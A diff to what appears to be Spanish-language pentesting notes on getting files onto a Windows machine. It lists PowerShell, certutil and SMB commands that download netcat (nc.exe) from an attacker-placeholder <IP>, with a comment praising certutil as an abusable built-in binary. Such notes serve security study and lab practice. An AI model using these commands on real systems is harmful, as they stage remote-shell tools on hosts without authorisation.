@@ -65,9 +65,9 @@ EXTRA:
    ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','nc.exe')"
    # PowerShell → varias alternativas si una falla
 
-2  ❯ certutil -urlcache -f http://<IP>/nc.exe nc.exe
-   ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe nc.exe
-   # Certutil → siempre disponible en Windows → muy fiable
+2  ❯ certutil -urlcache -f http://<IP>/nc.exe C:\Users\Public\nc.exe
+   ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe C:\Users\Public\nc.exe
+   # Certutil → siempre disponible en Windows porque es un LOLBAS → muy fiable
 
 3 ❯ copy \\<IP>\smbFolder\File.exe File.exe
    # Copiar archivo desde SMB de Kali a Windows
